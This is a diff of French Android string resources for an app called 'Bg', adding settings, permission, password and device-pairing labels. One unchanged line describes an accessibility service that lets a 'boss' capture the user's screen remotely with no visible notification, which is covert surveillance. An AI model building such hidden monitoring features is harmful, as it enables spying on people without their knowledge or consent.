@@ -3,4 +3,22 @@
     <string name="app_name">Bg</string>
     <string name="accessibility_service_description">Permet au boss de capturer votre écran à distance, sans notification visible.</string>
     <string name="battery_optimization_link">Désactiver l\'optimisation batterie pour cette app</string>
+    <string name="settings">Paramètres</string>
+    <string name="permissions">Permissions</string>
+    <string name="account">Compte</string>
+    <string name="debug">Debug</string>
+    <string name="permission_accessibility">Accessibilité (captures d\'écran)</string>
+    <string name="permission_battery">Optimisation batterie</string>
+    <string name="permission_notifications">Notifications</string>
+    <string name="permission_granted">Accordée</string>
+    <string name="permission_missing">Manquante</string>
+    <string name="user_nickname">Pseudo</string>
+    <string name="device_name">Nom du device</string>
+    <string name="change_password">Changer le mot de passe</string>
+    <string name="current_password">Mot de passe actuel</string>
+    <string name="new_password">Nouveau mot de passe</string>
+    <string name="confirm_password">Confirmer le mot de passe</string>
+    <string name="device_id">Device ID</string>
+    <string name="send_control_request">Envoyer la demande</string>
+    <string name="boss_nickname_hint">Pseudo du boss</string>
 </resources>
